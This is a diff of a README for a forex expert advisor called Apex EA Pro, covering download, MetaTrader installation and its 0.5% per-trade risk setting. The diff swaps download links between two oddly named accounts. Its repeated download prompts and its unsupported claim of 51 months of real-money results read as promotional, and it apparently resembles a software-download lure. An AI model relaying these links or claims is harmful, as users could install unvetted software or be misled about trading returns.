@@ -1,139 +1,72 @@
-# Apex EA Pro - Automated Trading Expert Advisor 2026
+# 📈 apex-automated-ea - Automate your forex trades with precision
 
-> **Apex EA Pro automates forex trading on MetaTrader 4 and MetaTrader 5 with a fixed 0.5% risk allocation per trade and a hard stop loss attached to every order.**
+[![](https://img.shields.io/badge/Download-Apex_EA_Pro-blue.svg)](https://github.com/guildsocialismincompetence200/apex-automated-ea)
 
-[![Platform](https://img.shields.io/badge/Platform-MetaTrader%204%20%7C%205-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/victorwscwalker5297/apex-automated-ea?style=flat-square)](https://github.com/victorwscwalker5297/apex-automated-ea)
+Apex EA Pro manages your forex trades on MetaTrader 4 and MetaTrader 5. It uses a fixed 0.5% risk allocation for every position. The software attaches a hard stop loss to every order to protect your capital.
 
----
+## 💻 System Requirements
 
-<p align="center">
-  <a href="https://victorwscwalker5297.github.io/apex-automated-ea/">
-    <img src="https://img.shields.io/badge/Download-Apex%20EA%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download Apex EA Pro">
-  </a>
-</p>
+You need a computer running Windows 10 or Windows 11. Ensure you have the MetaTrader 4 or MetaTrader 5 platform installed from your broker. You need an active internet connection to maintain the connection between the software and the market. Your computer must remain powered on while the software executes trades.
 
-> **[Download Apex EA Pro](https://victorwscwalker5297.github.io/apex-automated-ea/)**
+## 📥 How to Download
 
----
+Visit the link below to download the software files to your computer.
 
-[Download Latest Build](https://victorwscwalker5297.github.io/apex-automated-ea/)
+[Click here to visit the repository and download the files](https://github.com/guildsocialismincompetence200/apex-automated-ea)
 
----
+Click the green button labeled "Code" on the repository page. Select "Download ZIP" from the menu. Save the file to your desktop or your Downloads folder.
 
-## Overview
+## 🛠️ Installation Steps
 
-Apex EA Pro is a forex expert advisor built for automated workflows in both MetaTrader 4 and MetaTrader 5. It applies a defined trade-execution process with predetermined position risk and protection on each order.
+1. Find the ZIP file you downloaded.
+2. Right-click the file and select "Extract All."
+3. Open your MetaTrader platform.
+4. Click "File" in the top menu bar.
+5. Select "Open Data Folder."
+6. Open the folder named "MQL4" if you use MetaTrader 4, or "MQL5" if you use MetaTrader 5.
+7. Open the folder labeled "Experts."
+8. Copy the Apex EA file from your extracted folder and paste it into this "Experts" folder.
+9. Close and restart your MetaTrader platform.
+10. Look at the "Navigator" window on the left side of your screen.
+11. Expand the "Expert Advisors" section.
+12. Find Apex EA Pro in the list.
 
-The EA is intended for traders seeking a repeatable, rules-based alternative to manually handling every trade. Its published performance record covers 51 consecutive months of real-money results and includes both profitable and losing months for examination.
+## 🚀 Setting Up the Software
 
----
+Drag and drop the Apex EA Pro icon onto a currency chart. A settings window appears. Ensure you check the box labeled "Allow algorithmic trading." This step permits the software to place trades on your behalf. 
 
-## Core Capabilities
+The software automatically applies a 0.5% risk calculation to your account balance. It monitors the market prices and adjusts the hard stop loss according to the risk parameters. You do not need to input complex formulas. The software handles the math for every trade entry and exit.
 
-- Automated forex order execution through an expert advisor
-- MetaTrader 4 compatibility
-- MetaTrader 5 compatibility
-- Risk allocation fixed at 0.5% for each trade
-- Hard stop loss placed on every order
-- Published real-money results spanning 51 consecutive months
-- Position sizing based on a consistent risk-management approach
+## ⚙️ Understanding Risk Management
 
----
+Risk management protects your trading account. Apex EA Pro enforces a strict 0.5% risk limit per trade. This means the software calculates the position size so that your potential loss stays at 0.5% of your total balance. 
 
-## Setup and Installation
+The hard stop loss serves as a safety mechanism. It sends an instruction to your broker to close the trade if the price reaches a specific level. This prevents large losses during market volatility. The software attaches this stop loss the moment it opens a new trade.
 
-1. Get the newest Apex EA Pro build from the [download page](https://victorwscwalker5297.github.io/apex-automated-ea/).
-2. Choose the package corresponding to your MetaTrader edition.
-3. Install or copy the expert advisor files into the correct MetaTrader 4 or MetaTrader 5 application directory.
-4. Restart the terminal, or refresh the Navigator panel if the terminal is already open.
-5. Add Apex EA Pro to the desired chart and inspect its settings before switching on automated trading.
+## 🔍 Frequently Asked Questions
 
-Verify the terminal version before installing. The MT4 release must be used with MetaTrader 4, and the MT5 release must be used with MetaTrader 5.
+**Does the software work if I turn off my computer?**
+No. The software requires an active connection to the market. You must keep your computer running or use a Virtual Private Server to ensure the software stays connected.
 
----
+**Can I use this on a demo account?**
+Yes. You should test the software on a demo account first. This allows you to observe how the software manages trades without risking real money.
 
-## Getting Started
+**Do I need to change settings every day?**
+No. Once you attach the software to your chart, it works automatically based on the fixed 0.5% risk rule.
 
-Use the following sequence to configure a typical session:
+**How do I update the software?**
+If a new version becomes available, return to the repository link, download the updated files, and repeat the installation steps.
 
-1. Launch MetaTrader 4 or MetaTrader 5.
-2. Locate Apex EA Pro in the Navigator panel and confirm that it is available.
-3. Open the chart and trading environment where the advisor should operate.
-4. Attach the EA to the selected chart.
-5. Check the risk and stop-loss inputs.
-6. Enable automated trading only after verifying the configuration and terminal status.
-7. Observe the terminal and use the platform's standard reporting tools to review trading activity.
+## 🛡️ Best Practices
 
-Apex EA Pro uses a fixed default risk profile of 0.5% per trade. Every order is also set up with a hard stop loss.
+* Always verify that "Allow algorithmic trading" remains checked.
+* Monitor your open trades daily through the MetaTrader terminal.
+* Keep your MetaTrader platform updated to the latest version.
+* Review your account history to track the performance of the software.
+* Use a stable internet connection to prevent trade execution errors.
 
----
+## 📋 Troubleshooting
 
-## Settings
+If the software does not appear in your Navigator, refresh the list by right-clicking the "Expert Advisors" folder and selecting "Refresh." If a trade fails to open, check the "Journal" tab at the bottom of the MetaTrader window. This tab displays error messages if the broker rejects an order or if the connection fails. Ensure your account has sufficient funds to meet the margin requirements for the trades you wish to execute. Contact your broker if you encounter connection issues or authorization errors.
 
-After the expert advisor is attached to a chart, its available configuration is accessible through the MetaTrader properties dialog.
-
-Before activation, confirm:
-
-- The selected platform is MetaTrader 4 or MetaTrader 5
-- Trade risk is set to 0.5% per trade
-- Hard stop-loss behavior is understood and enabled
-- The intended chart and symbol are selected
-- Automated-trading permissions are available
-- The account and terminal are in the expected state
-
-Inspect the available inputs in the platform's properties window. Automated trading should remain disabled until the settings have been checked for the intended account and operating environment.
-
----
-
-## System Requirements
-
-- MetaTrader 4 or MetaTrader 5
-- An Apex EA Pro build compatible with the chosen platform
-- A suitable forex trading environment
-- An active MetaTrader terminal for automated operation
-- Adequate account resources for the selected setup
-- Available storage for the EA files and platform data
-
-Results and behavior may vary according to account conditions, broker settings, market conditions, and platform configuration. Review all applicable trading terms before use.
-
----
-
-## Frequently Asked Questions
-
-### Is Apex EA Pro compatible with MT4 and MT5?
-
-Yes. Apex EA Pro supports both MetaTrader 4 and MetaTrader 5. Install the build intended for the terminal you are using.
-
-### What is the configured trade risk?
-
-The stated risk setting is fixed at 0.5% per trade.
-
-### Are stop losses added to all orders?
-
-Yes. Each order is specified to use a hard stop loss.
-
-### Where is the newest build available?
-
-Select the [Download Latest Build](https://victorwscwalker5297.github.io/apex-automated-ea/) link near the beginning of this README.
-
-### How are the EA settings edited?
-
-Attach Apex EA Pro to a chart in MetaTrader, open its properties, and review the available inputs before enabling automated trading.
-
-### What can I verify if the EA does not run?
-
-Check that the matching MT4 or MT5 build is installed, Apex EA Pro is listed in the Navigator panel, automated trading is enabled where necessary, and the terminal is connected and configured properly.
-
-### Where are the published results documented?
-
-Apex EA Pro has a published real-money record covering 51 consecutive months. Consult the available project materials for the related results and context.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: forex, trading, metatrader, automation, risk-management, expert-advisor, windows
